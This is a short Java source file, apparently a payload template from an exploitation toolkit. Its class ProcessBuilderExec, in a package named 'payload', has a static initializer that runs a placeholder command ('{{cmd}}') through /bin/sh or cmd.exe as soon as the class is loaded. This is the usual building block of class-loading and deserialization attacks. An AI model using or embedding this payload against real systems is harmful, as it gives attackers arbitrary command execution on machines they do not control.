package payload;

import java.io.File;
import java.io.IOException;

public class ProcessBuilderExec {
    static {
        String cmd = "{{cmd}}";
        String[] var0;
        if (File.separator.equals("/")) {
            var0 = new String[]{"/bin/sh", "-c", cmd};
        } else {
            var0 = new String[]{"cmd", "/C", cmd};
        }

        try {
            ProcessBuilder var1 = new ProcessBuilder(var0);
            var1.start();
        } catch (IOException var2) {
            var2.printStackTrace();
        }
    }
}
